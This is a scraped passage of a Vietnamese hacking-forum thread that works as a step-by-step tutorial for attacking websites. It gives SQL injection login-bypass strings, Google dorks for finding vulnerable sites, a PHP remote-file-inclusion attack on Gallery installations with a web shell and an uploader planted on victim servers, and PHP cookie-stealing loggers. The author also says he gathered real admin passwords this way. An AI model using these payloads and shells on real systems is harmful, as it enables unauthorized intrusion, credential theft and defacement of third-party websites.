<br/> Symbols already loaded for /lib/libpam.so.0<br/> Symbols already loaded for /lib/libdl.so.2<br/> Symbols already loaded for /lib/i686/libc.so.6<br/> Symbols already loaded for /lib/ld-linux.so.2<br/> Symbols already loaded for /lib/libnss_files.so.2<br/> Symbols already loaded for /lib/libnss_nisplus.so.2<br/> Symbols already loaded for /lib/libnss_nis.so.2<br/> 0x40165544 in __libc_read () from /lib/i686/libc.so.6<br/> (gdb) c<br/> Continuing.<br/> Program received signal SIGSEGV, Segmentation fault.<br/> __libc_free (mem=0x61616161) at malloc.c:3136<br/> 3136 in malloc.c<br/><br/><br/> Việc khai thác qua lỗi này đến nay tôi test vẫn chưa thành công ( chẳng biết làm sai chỗ nào ) . Vậy bạn nào làm được hãy post lên cho anh em biết nhé .<br/> Lỗi Linux hiện nay rất ít ( đặc biệt là đối với Redhat ), các bạn hãy chờ đợi nếu có lỗi gì mới thì bên “LỗI bảo mật” sẽ cập nhật ngay . Khai thác chúng như thế nào thì hỏi Mod quản lý bên đó , đặc biệt là bạn Leonhart , cậu ta siêng trả lời các bạn lắm .<br/><br/> <i>( Dựa theo bài viết của huynh Binhnx2000 )</i><br/><br/> <b>36 . ) Tìm hiểu về SQL Injection :</b><br/><br/> _ SQL Injection là một trong những kiểu hack web đang dần trở nên phổ biến hiện nay. Bằng cách inject các mã SQL query/command vào input trước khi chuyển cho ứng dụng web xử lí, bạn có thể login mà không cần username và password, thi hành lệnh từ xa, đoạt dữ liệu và lấy root của SQL server. Công cụ dùng để tấn công là một trình duyệt web bất kì, chẳng hạn như Internet Explorer, Netscape, Lynx, ...<br/> _ Bạn có thể kiếm được trang Web bị lỗi bằng cách dùng các công cụ tìm kiếm để kiếm các trang cho phép submit dữ liệu . Một số trang Web chuyển tham số qua các khu vực ẩn nên bạn phảI viewsource mớI thấy được . VD ta xác định được trang này sử dụng Submit dữ liệu nhờ nhìn vào mã mà ta đã viewsource :<br/><br/><br/> CODE<br/> &lt;FORM action=Search/search.asp method=post&gt;<br/> &lt;input type=hidden name=A value=C&gt;<br/> &lt;/FORM&gt;<br/><br/><br/> _ Kiểm tra thử xem trang Web có bị lỗi này hay không bằng cách nhập vào login và pass lân lượt như sau :<br/><br/> - Login: hi' or 1=1--<br/> - Pass: hi' or 1=1--<br/><br/> Nếu không được bạn thử tiếp với các login và pass sau :<br/><br/><br/> CODE<br/> ' or 1=1--<br/> " or 1=1--<br/> or 1=1--<br/> ' or 'a'='a<br/> " or "a"="a<br/> ') or ('a'='a<br/><br/><br/> Nếu thành công, bạn có thể login vào mà không cần phải biết username và password .<br/> Lỗi này có dính dáng đến Query nên nếu bạn nào đã từng học qua cơ sở dữ liệu có thể khai thác dễ dàng chỉ bằng cách đánh các lệnh Query trên trình duyệt của các bạn . Nếu các bạn muốn tìm hiểu kỹ càng hơn về lỗi này có thể tìm các bài viết của nhóm vicky để tìm hiểu thêm .<br/><br/> <b>37 . ) Một VD về hack Web thông qua lỗi admentor ( Một dạng của lỗi SQL Injection ) :</b><br/> _ Trước tiên bạn vào google.com tìm trang Web admentor bằng từ khoá “allinurl : admentor” .<br/> _ Thông thường bạn sẽ có kết quả sau :<br/><br/><span class="link"> http://www.someserver.com/admentor/admin/admin.asp</span><br/><br/> _ Bạn thử nhập “ ' or ''=' ” vào login và password :<br/><br/><br/> CODE<br/> Login : ' or ''='<br/> Password : ' or ''='<br/><br/><br/> _ Nếu thành công bạn sẽ xâm nhập vào Web bị lỗi với vai trò là admin .<br/> _ Ta hãy tìm hiểu về cách fix lỗi này nhé :<br/> + Lọc các ký tự đặc biệt như “ ' " ~ \ ” bằng cách chêm vào javascrip đoạn mã sau :<br/><br/><br/> CODE<br/> function RemoveBad(strTemp)<br/> {<br/> strTemp = strTemp.replace(/\&lt;|\&gt;|\"|\'|\%|\;|\(|\)|\&|\+|<br/> \-/g,"");<br/> return strTemp;<br/> }<br/><br/><br/> + Và gọi nó từ bên trong của asp script :<br/><br/><br/> CODE<br/> var login = var TempStr = RemoveBad<br/> (Request.QueryString("login"));<br/> var password = var TempStr = RemoveBad<br/> (Request.QueryString("password"));<br/><br/><br/> _ Vậy là ta đã fix xong lỗi .<br/> _ Các bạn có thể áp dụng cách hack này cho các trang Web khác có submit dữ liệu , các bạn hãy test thử xem đi , các trang Web ở Việt Nam mình bị nhiều lắm , tôi đã kiếm được kha khá pass admin bằng cách thử này rồi ( nhưng cũng đã báo để họ fix lại ) .<br/> _ Có nhiều trang khi login không phải bằng “ ' or ''=’ ” mà bằng các nick name có thật đã đăng ký trên trang Web đó , ta vào link “thành viên” kiếm nick của một admin để test thử nhé .<br/> Hack vui vẻ . het phan 5<br/> ====================================================<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/131.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/131/520.html#520,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><br/> <font size='+3'><b>Phần 4 </b></font><br/><br/> <b>26 . ) Tìm hiểu về RPC (Remote Procedure Call) :</b><br/><br/> _ Windows NT cung cấp khả năng sử dụng RPC để thực thi các ứng dụng phân tán . Microsoft RPC bao gồm các thư viện và các dịch vụ cho phép các ứng dụng phân tán hoạt động được trong môi trường Windows NT. Các ứng dụng phân tán chính bao gồm nhiều tiến trình thực thi với nhiệm vụ xác định nào đó. Các tiến trình này có thể chạy trên một hay nhiều máy tính.<br/> _Microsoft RPC sử dụng name service provider để định vị Servers trên mạng. Microsoft RPC name service provider phải đi liền với Microsoft RPC name service interface (NIS). NIS bao bao gồm các hàm API cho phép truy cập nhiều thực thể trong cùng một name service database (name service database chứa các thực thể, nhóm các thực thể, lịch sử các thực thể trên Server).<br/> Khi cài đặt Windows NT, Microsoft Locator tự động được chọn như là name service provider. Nó là name service provider tối ưu nhất trên môi trường mạng Windows NT.<br/><br/> <b>27 . ) Kỹ thuật đơn giản để chống lại sự xâm nhập trái phép khi đang online thông qua RPC (Remote Procedure Call) :</b><br/><br/> _ Nếu bạn nghi ngờ máy của mình đang có người xâm nhập hoặc bị admin remote desktop theo dõi , bạn chỉ cần tắt chức năng remote procedure call thì hiện tại không có chương trình nào có thể remote desktop để theo dõi bạn được . Nó còn chống được hầu hết tools xâm nhập vào máy ( vì đa số các tools viết connect dựa trên remote procedure call ( over tcp/ip )).Các trojan đa số cũng dựa vào giao thức này.<br/><br/> Cách tắt: Bạn vào service /remote procedure call( click chuột phải ) chọn starup typt/disable hoặc manual/ apply.<br/><br/> Đây là cách chống rất hữu hiệu với máy PC , nếu thêm với cách tắt file sharing thì rất khó bị hack ) ,nhưng trong mạng LAN bạn cũng phiền phức với nó không ít vì bạn sẽ không chạy được các chương trình có liên quan đến thiết bị này . Tùy theo cách thức bạn làm việc mà bạn có cách chọn lựa cho hợp lý . Theo tôi thì nếu dùng trong mạng LAN bạn hãy cài một firewall là chắc chắn tương đối an toàn rồi đó .<br/><br/> <i>( Dựa theo bài viết của huynh “Đời như củ khoai ” khoaimi – admin của HVA ) </i><br/><br/> <b>28 . ) Những bước để hack một trang web hiện nay :</b><br/><br/> _ Theo liệt kê của sách Hacking Exposed 3 thì để hack một trang Web thông thường ta thực hiện những bước sau :<br/> + FootPrinting : ( In dấu chân )<br/> Đây là cách mà hacker làm khi muốn lấy một lượng thông tin tối đa về máy chủ/doanh nghiệp/người dùng. Nó bao gồm chi tiết về địa chỉ IP, Whois, DNS ..v.v đại khái là những thong tin chính thức có lien quan đến mục tiêu. Nhiều khi đơn giản hacker chỉ cần sử dụng các công cụ tìm kiếm trên mạng để tìm những thong tin đó.<br/> + Scanning : ( Quét thăm dò )<br/> Khi đã có những thông tin đó rồi, thì tiếp đến là đánh giá và định danh những những dịch vụ mà mục tiêu có. Việc này bao gồm quét cổng, xác định hệ điều hành, .v.v.. Các công cụ được sử dụng ở đây như nmap, WS pingPro, siphon, fscam và còn nhiều công cụ khác nữa.<br/> + Enumeration : ( liệt kê tìm lỗ hổng )<br/> Bước thứ ba là tìm kiếm những tài nguyên được bảo vệ kém, hoạch tài khoản người dùng mà có thể sử dụng để xâm nhập. Nó bao gồm các mật khẩu mặc định, các script và dịch vụ mặc định. Rât nhiều người quản trị mạng không biết đến hoặc không sửa đổi lại các giá trị này.<br/> + Gaining Access: ( Tìm cách xâm nhập )<br/> Bây giờ kẻ xâm nhập sẽ tìm cách truy cập vào mạng bằng những thông tin có được ở ba bước trên. Phương pháp được sử dụng ở đây có thể là tấn công vào lỗi tràn bộ đệm, lấy và giải mã file password, hay thô thiển nhất là brute force (kiểm tra tất cả các trường hợp) password. Các công cụ thường được sử dụng ở bước này là NAT, podium, hoặc L0pht.<br/> + Escalating Privileges : ( Leo thang đặc quyền )<br/> Ví dụ trong trường hợp hacker xâm nhập đựợc vào mạng với tài khoản guest, thì họ sẽ tìm cách kiểm soát toàn bộ hệ thống. Hacker sẽ tìm cách crack password của admin, hoặc sử dụng lỗ hổng để leo thang đặc quyền. John và Riper là hai chương trình crack password rất hay được sử dụng.<br/> + Pilfering : ( Dùng khi các file chứa pass bị sơ hở )<br/> Thêm một lần nữa các máy tìm kiếm lại đựơc sử dụng để tìm các phương pháp truy cập vào mạng. Những file text chứa password hay các cơ chế không an toàn khác có thể là mồi ngon cho hacker.<br/> + Covering Tracks : ( Xoá dấu vết )<br/> Sau khi đã có những thông tin cần thiết, hacker tìm cách xoá dấu vết, xoá các file log của hệ điều hành làm cho người quản lý không nhận ra hệ thống đã bị xâm nhập hoặc có biêt cũng không tìm ra kẻ xâm nhập là ai.<br/> + Creating "Back Doors" : ( Tạo cửa sau chuẩn bị cho lần xâm nhập tiếp theo được dễ dàng hơn )<br/> Hacker để lại "Back Doors", tức là một cơ chế cho phép hacker truy nhập trở lại bằng con đường bí mật không phải tốn nhiều công sức, bằng việc cài đặt Trojan hay tạo user mới (đối với tổ chức có nhiều user). Công cụ ở đây là các loại Trojan, keylog…<br/> + Denial of Service (DoS) : ( Tấn công kiểu từ chối dịch vụ )<br/> Nêu không thành công trong việc xâm nhập, thì DoS là phương tiện cuối cùng để tấn công hệ thống. Nếu hệ thống không được cấu hình đúng cách, nó sẽ bị phá vỡ và cho phép hacker truy cập. Hoặc trong trường hợp khác thì DoS sẽ làm cho hệ thống không hoạt động được nữa. Các công cụ hay được sử dụng để tấn công DoS là trin00, Pong Of Death, teardrop, các loại nuker, flooder . Cách này rất lợi hại , và vẫn còn sử dụng phổ biến hiện nay .<br/> _ Tuỳ theo hiểu biết và trình độ của mình mà một hacker bỏ qua bước nào . Không nhất thiết phảI làm theo tuần tự . Các bạn hãy nhớ đến câu “ biết người biết ta trăm trận trăm thắng ” .<br/><br/> <i>( Tài liệu của HVA và hackervn.net )</i><br/><br/> <b>29 . ) Cách tìm các Website bị lỗi : </b><br/><br/> _ Chắc các bạn biết đến các trang Web chuyên dùng để tìm kiếm thông tin trên mạng chứ ? Nhưng các bạn chắc cũng không ngờ là ta có thể dùng những trang đó để tìm những trang Web bị lỗi ( Tôi vẫn thường dùng trang google.com và khuyên các bạn cũng nên dùng trang này vì nó rất mạnh và hiệu quả ) .<br/> _ Các bạn quan tâm đến lỗi trang Web và muốn tìm chúng bạn chỉ cần vào google.com và đánh đoạn lỗi đó vào sau “allinurl : ” . VD ta có đoạn mã lỗi trang Web sau :<br/><br/> cgi-bin/php.cgi?/etc/passwd<br/><br/> các bạn sẽ đánh :<br/><br/> “allinurl:cgi-bin/php.cgi?/etc/passwd”<br/><br/> Nó sẽ liệt kê ra những trang Web đang bị lỗi này cho các bạn , các bạn hãy nhìn xuống dưới cùng của mỗi mẫu liệt kê ( dòng địa chỉ màu xanh lá cây ) nếu dòng nào viết y chang từ khoá mình nhập vào thì trang đó đã hoặc đang bị lỗi .Các bạn có xâm nhập vào được hay không thì cũng còn tuỳ vào trang Web đó đã fix lỗi này hay chưa nữa .<br/> _ Các bạn quan tâm đến lỗi forum , các bạn muốn tìm forum dạng này để thực tập , chỉ cần nhập từ khoá<br/><br/> powered by &lt;tên forum&gt; &lt;số phiên bản&gt;<br/><br/> VD sau là để tìm forum dùng Snitz 2000 :<br/><br/> powered by Snitz 2000<br/><br/> _ Tuy nhiên , việc tìm ra đúng forum hoặc trang Web bị lỗi theo cách đó có xác suất không cao , bạn hãy quan tâm đến đoạn string đặc biệt trong URL đặc trưng cho từng kiểu trang Web hoặc forum đó ( cái này rất quan trọng , các bạn hãy tự mình tìm hiểu thêm nhé ) . VD tìm với lỗi Hosting Controller thì ta sẽ có đoạn đặc trưng sau<br/><br/> "/admin hay /advadmin hay /hosting"<br/><br/> ta hãy đánh từ khoá :<br/><br/> allinurl:/advadmin<br/> hoặc allinurl:/admin<br/> hoặc allinurl:/hosting<br/><br/> Nó sẽ liệt kê ra các trang Web có URL dạng :<br/><br/><span class="link"> http://tentrangweb.com/advadmin</span><br/> hoặc<span class="link"> http://tentrangweb.com/admin</span><br/> hoặc<span class="link"> http://tentrangweb.com/hosting</span><br/><br/> VD với forum UBB có đoạn đặc trưng<br/><br/> "cgi-bin/ultimatebb.cgi?"<br/><br/> Ta cũng tìm tương tự như trên .<br/> Chỉ cần bạn biết cách tìm như vậy rồi thì sau này chỉ cần theo dõi thông tin cập nhật bên trang “Lỗi bảo mật” của HVA do bạn LeonHart post hằng ngày các bạn sẽ hiểu được ý nghĩa của chúng và tự mình kiểm tra .<br/><br/> <b>30 . ) Kỹ thuật hack Web thông qua lỗi Gallery ( một dạng của lỗi php code inject ):</b><br/><br/> _ Gallery là một công cụ cho phép tạo một gallery ảnh trên web được viết bằng PHP , lợi dụng sơ hở này ta có thể lợi dụng để viết thêm vào đó một mã PHP cho phép ta upload , đó chính là mục đích chính của ta .<br/> _ Trước hết bạn hãy đăng ký một host miễn phí , tốt nhất là bạn đăng ký ở brinkster.com cho dễ . Sau đó bạn mở notepad và tạo file PHP với đoạn mã sau :<br/><br/><br/> <blockquote>CODE<br/> &lt;?php<br/> global $PHP_SELF;<br/> echo "&lt;html&gt;&lt;body&gt;<br/> &lt;form method=post action=$PHP_SELF?$QUERY_STRING&gt;<br/> &lt;input type=text name=shell size=40&gt;<br/> &lt;input type=hidden name=act value=shell&gt;<br/> &lt;input type=submit value=Go name=sm&gt;<br/> &lt;/form&gt;";<br/> set_magic_quotes_runtime(1);<br/> if ($act == "shell") {<br/> echo "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;xmp&gt;";<br/> system($shell);<br/> echo "&lt;/xmp&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";}<br/> echo "&lt;/body&gt;&lt;/html&gt;";<br/> ?&gt;&nbsp;
</blockquote><br/><br/><br/> Đoạn mã này bạn hãy tạo làm 2 file có tên khác nhau ( nhưng cùng chung một mã ) và đặt tên là :<br/> + shellphp.php : file này dùng để chạy shell trên victim host .<br/> + init.php : file này dùng để upload lên trang có host bạn vừa tạo . ( Bạn hãy upload file init.php này lên sớm vì ta sẽ còn sử dụng nó nhưng với đoạn mã khác , bạn quên upload file này lên là tiêu )<br/><br/> Bạn hãy tạo thêm một file PHP với mã sau :<br/><br/><br/> <blockquote>CODE<br/> &lt;?php<br/> function handleupload() {<br/> if (is_uploaded_file($_FILES['userfile']['tmp_name'])) {<br/> $filename = $_FILES['userfile']['tmp_name'];<br/> print "$filename was uploaded successfuly";<br/> $realname = $_FILES['userfile']['name'];<br/> print "realname is $realname\n";<br/> print "copying file to uploads dir ".$realname;<br/> copy($_FILES['userfile']['tmp_name'],*PATH*.$realname); <b>// lưu ý *PATH* chúng ta sẽ thay đổi sau</b><br/> } else {<br/> echo "Possible file upload attack: filename".$_FILES['userfile']['name'].".";<br/> }<br/> }<br/> if ($act == "upload") {<br/> handleupload();<br/> }<br/> echo "&lt;html&gt;&lt;body&gt;<br/> &lt;form ENCTYPE=multipart/form-data method=post action=$PHP_SELF?$QUERY_STRING&gt;<br/> File:&lt;INPUT TYPE=FILE NAME=userfile SIZE=35&gt;<br/> &lt;input type=hidden name=MAX_FILE_SIZE value=1000000&gt;<br/> &lt;input type=hidden name=act value=upload&gt;<br/> &lt;input type=submit value=Upload name=sm&gt;<br/> &lt;/form&gt;<br/> &lt;/body&gt;&lt;/html&gt;";<br/> ?&gt;&nbsp;
</blockquote><br/><br/><br/> Bạn hãy đặt tên là upload.php , nó sẽ dùng để upload lên trang Web của nạn nhân .<br/> _ Tiếp theo Bạn vào Google, gõ "Powered by gallery" rồi enter, Google sẽ liệt kê một đống những site sử dụng Gallery , bạn hãy chọn lấy một trang bất kỳ rồI dùng link sau để thử xem nó còn mắc lỗI Gallery hay không :<br/><br/><span class="link"> http://&lt;tên</span> trang Web của nạn nhân&gt;/gallery./captionator.php?GALLERY_BASEDIR=http://wwwxx.brinkster.com/&lt;tên host bạn vừa đăng ký&gt;/<br/><br/> Nếu bạn thấy hiện lên một ô hình chữ nhật ở phía trên cùng , bên phải của nó là ô lệnh chuyển tiếp có chữ “Go” là coi như bạn đã tìm thấy được đốI tượng rồi đó . Bây giờ bạn đã có thể gõ lệnh thông qua ô chữ nhật đó để hack Web của nạn nhân .<br/> Trước hết bạn hãy gõ lệnh “pwd” để xác định đường dẫn tuyệt đối đến thư mục hiện thời rồi nhấn nút “Go” , khi nó cho kết quả bạn hãy nhanh chóng ghi lại đường dẫn ở phía dướI ( Tôi sẽ sử dụng VD đường dẫn tôi tìm thấy là “/home/abc/xyz/gallery” ).<br/> Sau đó bạn đánh tiếp lệnh “|s –a|” để liệt kê các thư mục con của nó . Bây giờ bạn hãy nhìn kết quả , bạn sẽ thấy một đống các thư mục con mà ta đã liệt kê . Bạn hãy luôn nhớ là mục đích của chúng ta là tìm một thư mục có thể dùng để upload file upload.php mà ta đã chuẩn bị từ trước do đó bạn hãy xác định cùng tôi bằng cách nhìn vào những chữ cuốI cùng của mỗi hàng kết quả :<br/> + Bạn hãy loại bỏ trường hợp các thư mục mà có dấu “.” hoặc “..” vì đây là thư mục gốc hoặc là thư mục ảo ( Nó thường được xếp trên cùng của các hàng kết quả ) .<br/> + Bạn cũng loạI bỏ những hàng có chữ cuối cùng có gắn đuôi ( VD như config.php , check.inc .v.v… ) vì đây là những file chứ không phải là thư mục .<br/> + Còn lại là những thư mục có thể upload nhưng tôi khuyên bạn nên chọn những hàng chứa tên thư mục mà có chứa số lớn hơn 1 ( Bạn có thể xác định được chúng bằng cách nhìn cột thứ 2 từ trái sang ) , vì như vậy vừa chắc chắn đây là thư mục không phải thư mục ảo , vừa làm cho admin của trang Web đó khó phát hiện khi ta cài file của ta vào . Tôi VD tôi phát hiện ra thư mục “loveyou” có chứa 12 file có thể cho ta upload , như vậy đường dẫn chính thức mà ta upload lên sẽ là :<br/><br/> /home/abc/xyz/Gallery/loveyou<br/><br/> Bây giờ bạn hãy vào account host của bạn, sửa nội dung file init.php giống như mã của file upload.php, nhưng sửa lại *PATH* thành “/home/abc/xyz/gallery/loveyou/ ”. Đồng thời cũng chuẩn bị một file upload.php trên máy của bạn với *PATH* là “” ( 2 dấu ngoặc kép ).<br/> Bây giờ là ta đã có thể upload file upload.php lên trang Web của nạn nhân được rồi , bạn hãy nhập địa chỉ sau trên trình duyệt Web của bạn :<br/><br/><span class="link"> http://&lt;tên</span> trang Web của nạn nhân&gt;/gallery./captionator.php?GALLERY_BASEDIR=http://wwwxx.brinkster.com/&lt;tên trang Host bạn đã tạo từ đầu&gt;/<br/><br/> Bạn sẽ thấy xuất hiện tiếp một khung hình chữ nhật và bên cạnh là có 2 nút lệnh , một là nút “brown” , một là nút “upload” . Nút “brown” bạn dùng để dẫn đến địa chỉ file upload.php bạn đã chuẩn bị trên máy của bạn , nút “upload” khi bạn nhấn vào đó thì nó sẽ upload file upload.php lên trang Web của nạn nhân . Ok , bây giờ coi như bạn đã hoàn thành chặng đường hack Web rồi đó . Từ bây giờ bạn hãy vận dụng để tấn công đối thủ như lấy database , password ( làm tương tự như các bài hướng dẫn hack trước ) , nhưng các bạn chỉ nên thực tập chứ đừng xoá database hay phá Web của họ. Nếu là một hacker chân chính các bạn chỉ cần upload lên trang Web dòng chữ : “Hack by ……..” là đủ rồi .<br/> Cũng như những lần trước , các bạn có thành công hay không cũng tuỳ thuộc vào sự may mắn và kiên trì nghiên cứu vận dụng kiến thức của các bạn .<br/><br/> <i>( Dựa theo hướng dẫn hack của huynh vnofear – viethacker.net )</i><br/><br/><br/> ( Hết phần 4 )<br/> ****************************************<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/131.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/131/519.html#519,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><i>Xin mạn phép đưa ra một vài bổ sung về phần IP.Mong anhdenday đừng giận.</i><br/> <blockquote><br/> 1-Làm sao biết địa chỉ IP của mình trong mạng LAN ?<br/> Rất đơn giản ,bạn thoát ra DOS : Start -&gt;Programs -&gt; Command Prompt.<br/><br/> C:\windows&gt;<br/><br/> Bạn đánh<br/><br/> C:\windows&gt;tracert PC1<br/> (trong đó PC1 là tên máy tính của bạn)<br/><br/> Bạn sẽ được kết quả<br/><br/> Tracing route to COMPUTER1[192.168.0.1]<br/> over a maximum of 30 hops:<br/><br/> 1 &lt;1 ms &lt;1 ms &lt;1 ms [192.168.0.1]<br/> Trace complete.<br/><br/> 198.168.0.1 chính là địa chỉ IP của bạn trong mạng LAN<br/><br/> Mỗi địa chỉ IP gồm 2 phần : 1 là địa chỉ mạng và 1 địa chỉ host . Tất cả các máy tính trong 1 mạng có địa chỉ mạng giống nhau và trong khi địa chỉ host thì duy nhất với chỉ 1 máy tính . Địa chỉ mạng có thể chiếm 1 đến 3 nhóm<br/><br/> Vd : vớI địa chỉ IP 192.168.0.1 thì<br/><br/> 192.168.0 là địa chỉ mạng còn 1 là địa chỉ host . Các máy có thể cùng địa chỉ mạng nhưng bắt buộc phảI khác địa chỉ host .<br/> 2-Làm sao để lấy được địa chỉ IP của một người , một website hay một máy tính khác ?<br/> *Giả sử bạn muốn lấy địa chỉ IP của www.yahoo.com . Bạn làm đơn giản như sau . Thoát ra DOS . Bạn gõ<br/><br/> C:\windows&gt;ping www.yahoo.com<br/><br/> Pinging yahoo.com [216.115.108.245] with 32 bytes of data:<br/><br/> Request timed out.<br/><br/> Request timed out.<br/><br/> Request timed out.<br/><br/> Request timed out.<br/><br/> Here 216.115.108.245 is the ip address of www.yahoo.com<br/><br/> *Cũng như vậy, nếu bạn muốn lấy 1 địa chỉ IP của 1 máy tính tên PC2 trong 1 mạng LAN bạn sẽ có được địa chỉ IP của PC2<br/><br/> C:\windows&gt;ping PC2<br/><br/> *Lấy IP của một người đang chat với mình :<br/> -Sử dụng ICQ<br/><br/> Chỉ cần hỏi anh ta có đồng nối với bạn trên ICQ, nếu có sự trả lời có nghĩa kết nối đã được thực hiện . Trong khi đang chat bạn tạm thoát ra DOS và gõ netstat -n và bạn sẽ lấy được địa chỉ IP của anh ta . Nhưng bạn phải chắc chắn ràng bạn không sử dụng bất kỳ 1 phần mềm nào liên kết với Internet khác bởi vì điều đó có thể cho bạn nhiều địa chỉ IP gồm địa chỉ của anh ta và những dịch vụ bạn đang kết nối sẽ được xuất ra khi gõ netstart -n (bài sau sẽ nói rõ hơn về các lệnh của netstart)<br/><br/><br/> -Sử dụng MSN và YAHOO MESSENGERS<br/><br/> Trong trường hợp sử dụng các chương trình Yahoo hay MSN để chat. Nếu bạn sử dụng lệnh netstart -n bạn sẽ không lấy được địa chỉ IP của người mình đang chat . Chúng ta làm cách nào để lấy đây ??? Có một cách đó là . Bạn nói rằng bạn sẽ gửi cho anh ta 1 bài nhạc rất hay hoặc là 1 thứ gì đó bằng cách SEND FILE . Nếu anh ta đồng ý bạn hãy gửi cho anh ta 1 file mà anh ta thích . Trong khi file được gửi đi bạn tạm thoát ra DOS và gõ lệnh netstart -n và bạn sẽ tìm thấy địa chỉ của anh ta vì khi gửi 1 file thì sự kết nối của bạn và anh ta là trực tiếp không phải qua server của Yahoo hay MSN xử lý<br/><br/> -Lấy địa chỉ IP của những người đến thăm website của bạn<br/><br/> Bạn có 1 website và bạn muốn lấy các địa chỉ IP của những người đến thăm website của bạn. Bạn có thể viết 1 script trong mã trang HTML của website bạn như sau . Chúng ta chí cần viết cho trang chính mà thôi<br/><br/> Đây là đoạn script mà bạn sẽ gắn vào trang web của bạn.<br/> &lt;HTML&gt;<br/> &lt;HEAD&gt;<br/> &lt;script LANGUAGE="JavaScript"&gt;<br/> var ip = new java.net.InetAddress.getLocalHost();<br/> var ipStr = new java.lang.String(ip);<br/> document.writeln(ipStr.substring(ipStr.indexOf("/")+1));<br/> &lt;/SCRIPT&gt;<br/> &lt;/HEAD&gt;<br/><br/> Chú ý đoạn script này có thể không chạy trên 1 số trình brower (duyệt web)&nbsp;
</blockquote><br/><br/><br/> <font size='+3'><b>Phần 3</b></font><br/><br/><br/> <b>20 . ) Cookie là gì ?</b><br/><br/> _ Cookie là những phần dữ liệu nhỏ có cấu trúc được chia sẻ giữa web site và browser của người dùng. cookies được lưu trữ dưới những file dữ liệu nhỏ dạng text (size dưới 4k). Chúng được các site tạo ra để lưu trữ/truy tìm/nhận biết các thông tin về người dùng đã ghé thăm site và những vùng mà họ đi qua trong site. Những thông tin này có thể bao gồm tên/định danh người dùng, mật khẩu, sở thích, thói quen...Cookie được browser của người dùng chấp nhận lưu trên đĩa cứng của máy mình, ko phải browser nào cũng hỗ trợ cookie. Sau một lần truy cập vào site, những thông tin về người dùng được lưu trữ trong cookie. Ở những lần truy cập sau đến site đó, web site có thể dùng lại những thông tin trong cookie (như thông tin liên quan đến việc đăng nhập vào 1 forum...) mà người ko phải làm lại thao tác đăng nhập hay phải nhập lại các thông tin khác. Vấn đề đặt ra là có nhiều site quản lý việc dùng lại các thông tin lưu trong cookie ko chính xác, kiểm tra ko đầy đủ hoặc mã hoá các thông tin trong cookie còn sơ hở giúp cho hacker khai thác để vượt qua cánh cửa đăng nhập, đoạt quyền điêu khiển site .<br/><br/> _ Cookies thường có các thành phần sau :<br/><br/> + Tên: do người lập trình web site chọn<br/> + Domain: là tên miền từ server mà cookie được tạo và gửi đi<br/> + Đường dẫn: thông tin về đường dẫn ở web site mà bạn đang xem<br/> + Ngày hết hạn: là thời điểm mà cookie hết hiệu lực .<br/> + Bảo mật: Nếu giá trị này đựơc thiết lập bên trong cookie, thông tin sẽ đựơc mã hoá trong quá trình truyền giữa server và browser.<br/> + Các giá trị khác: là những dữ liệu đặc trưng được web server lưu trữ để nhận dạng về sau các giá trị này ko chứa các khoảng trắng, dấu chấm, phẩy và bị giới hạn trong khoảng 4k.<br/><br/> ( Tài liệu của Viethacker.net )<br/><br/> <b>21 . ) Kỹ thuật lấy cắp cookie của nạn nhân :</b><br/><br/> _ Trước hết , các bạn hãy mở notepad rồi chép đoạn mã sau vào notepad đó :<br/><br/><br/> <blockquote>CODE<br/> &lt;?php<br/> define ("LINE", "\r\n");<br/> define ("HTML_LINE", "&lt;br&gt;");<br/> function getvars($arr, $title)<br/> {<br/> $res = "";<br/> $len = count($arr);<br/> if ($len&gt;0)<br/> {<br/> if (strlen($title)&gt;0)<br/> {<br/> print("[--------$title--------]" . HTML_LINE);<br/> $res .= "[--------$title--------]" . LINE;<br/> }<br/> foreach ($arr as $key =&gt; $value)<br/> {<br/> print("[$key]" . HTML_LINE);<br/> print($arr[$key] . HTML_LINE);<br/> $res .= "[$key]" . LINE . $arr[$key] . LINE;<br/> }<br/> }<br/> return $res;<br/> }<br/> // get current date<br/> $now = date("Y-m-d H:i:s");<br/> // init<br/> $myData = "[-----$now-----]" . LINE;<br/> // get<br/> $myData .= getvars($HTTP_GET_VARS, "");<br/> // file<br/> $file = $REMOTE_ADDR . ".txt";<br/> $mode = "r+";<br/> if (!file_exists($file))<br/> $mode = "w+";<br/> $fp = fopen ($file, $mode);<br/> fseek($fp, 0, SEEK_END);<br/> fwrite($fp, $myData);<br/> fclose($fp);<br/> ?&gt;&nbsp;
</blockquote><br/><br/> hoặc<br/><br/><br/> <blockquote>CODE<br/> &lt;?php<br/> if ($contents && $header){<br/> mail("victim@yahoo.com" , "from mail script",$contents,$header) or<br/> die('couldnt email it');<br/> sleep(2);<br/> ?&gt;<br/> &lt;script language=javascript&gt;<br/><br/> &lt;/script&gt;<br/> &lt;?php<br/> } else {<br/> echo "nope";<br/> }&nbsp;
